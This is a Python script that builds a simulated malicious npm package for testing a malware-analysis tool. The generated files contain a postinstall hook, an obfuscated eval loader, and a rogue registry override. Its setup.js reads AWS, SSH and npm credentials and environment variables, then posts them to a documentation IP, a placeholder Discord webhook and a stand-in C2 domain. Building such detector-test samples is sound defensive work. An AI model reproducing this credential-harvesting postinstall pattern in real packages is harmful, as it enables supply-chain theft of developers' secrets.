"""Builds `colorz-utill` — a SIMULATED-malicious npm package for exercising
npm-ide-analyst end to end (static analysis + dynamic detonation).

THIS IS NOT REAL MALWARE. It is a lab artifact:
  * typosquat name, fake obfuscation, and a "postinstall" auto-run foothold;
  * all network targets are RFC 5737 documentation IPs (198.51.100.0/24) and a
    non-routable placeholder webhook — nothing real is ever contacted;
  * it reads canary paths (~/.aws, ~/.ssh, ~/.npmrc) that only exist as decoys
    inside the tool's isolated container.
It is designed to trip every detector. Detonate ONLY with npm-ide-analyst's
sandbox (which neuters process/network/fs), never by running `npm install`.

Usage:
    python samples/colorz-utill/build.py --out DIR
    # then:
    npm-ide-analyst analyze DIR/colorz-utill-2.3.9.tgz --out report --dynamic
"""
from __future__ import annotations

import argparse
import base64
import json
import pathlib
import tarfile
import tempfile
import textwrap

NAME = "colorz-utill"
VERSION = "2.3.9"


def build(out_dir: pathlib.Path) -> pathlib.Path:
    """Write the sample tarball into out_dir and return its path."""
    out_dir.mkdir(parents=True, exist_ok=True)
    stage_root = pathlib.Path(tempfile.mkdtemp(prefix="colorz-src-"))
    pkg = stage_root / "package"
    (pkg / "scripts").mkdir(parents=True, exist_ok=True)
    (pkg / "lib").mkdir(parents=True, exist_ok=True)

    # package.json — typosquat + auto-run postinstall foothold
    (pkg / "package.json").write_text(json.dumps({
        "name": NAME,
        "version": VERSION,
        "description": "Blazing fast ANSI color utilities for the terminal",
        "main": "index.js",
        "scripts": {"postinstall": "node ./scripts/setup.js"},
        "keywords": ["color", "ansi", "terminal", "cli"],
        "author": "colorz-team",
        "license": "MIT",
    }, indent=2), encoding="utf-8")

    # rogue registry override + auth token (config-hijack detector)
    (pkg / ".npmrc").write_text(
        "registry=https://npm.evil-mirror.io/\n"
        "//npm.evil-mirror.io/:_authToken=abc123\n", encoding="utf-8")

    # benign-looking main that also pulls the obfuscated loader
    (pkg / "index.js").write_text(textwrap.dedent("""\
        'use strict';
        const loader = require('./lib/loader.js');
        module.exports = { red: (s) => `\\x1b[31m${s}\\x1b[0m`, load: loader };
        """), encoding="utf-8")

    # heavily obfuscated loader: long base64 blob + eval (static obfuscation/AST)
    blob = base64.b64encode(b"module.exports=function(){return 'loaded';}").decode()
    padding = base64.b64encode(b"x" * 120).decode()  # long blob to trip IOC scan
    (pkg / "lib" / "loader.js").write_text(
        f"var _0x1a2b=['{blob}','{padding}'];"
        f"module.exports=eval(Buffer.from(_0x1a2b[0],'base64').toString());\n",
        encoding="utf-8")

    # postinstall payload: harvest secrets + env, decode a stage-2 loader, exfil
    stage2 = "require('dns').lookup('c2.evil-collector.xyz', function(){});"
    stage2_b64 = base64.b64encode(stage2.encode()).decode()
    (pkg / "scripts" / "setup.js").write_text(textwrap.dedent(f"""\
        /*
         * LAB ARTIFACT - SIMULATED malicious payload for npm-ide-analyst testing.
         * Not real malware. Network targets are RFC5737 documentation IPs.
         * Executes only inside the isolated detonation sandbox (all ops neutered).
         */
        'use strict';
        const cp = require('child_process');
        const fs = require('fs');
        const os = require('os');
        const https = require('https');

        function safeRead(p) {{ try {{ return fs.readFileSync(p, 'utf8'); }} catch (e) {{ return null; }} }}

        // stage 1: harvest environment + local developer secrets
        const home = os.homedir();
        const loot = {{
          env: process.env,
          aws: safeRead(home + '/.aws/credentials'),
          ssh: safeRead(home + '/.ssh/id_rsa'),
          npmrc: safeRead(home + '/.npmrc'),
        }};

        // stage 2: host fingerprint
        cp.exec('whoami && hostname', function () {{}});

        // stage 3: decode + run second-stage loader from base64
        const stage2 = Buffer.from('{stage2_b64}', 'base64').toString();
        eval(stage2);

        // stage 4: exfiltrate to C2 (RFC5737 doc IP) + backup webhook channel
        const req = https.request('https://198.51.100.14/collect', {{ method: 'POST' }});
        req.write(JSON.stringify(loot));
        req.end();
        https.request('https://discord.com/api/webhooks/000000000/deadbeefcafe', {{ method: 'POST' }}).end();
        """), encoding="utf-8")

    tgz = out_dir / f"{NAME}-{VERSION}.tgz"
    with tarfile.open(tgz, "w:gz") as tf:
        tf.add(pkg, arcname="package")
    return tgz


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="Build the colorz-utill lab sample.")
    ap.add_argument("--out", type=pathlib.Path, default=pathlib.Path(__file__).parent,
                    help="output directory for the .tgz (default: this folder)")
    args = ap.parse_args()
    print(build(args.out))
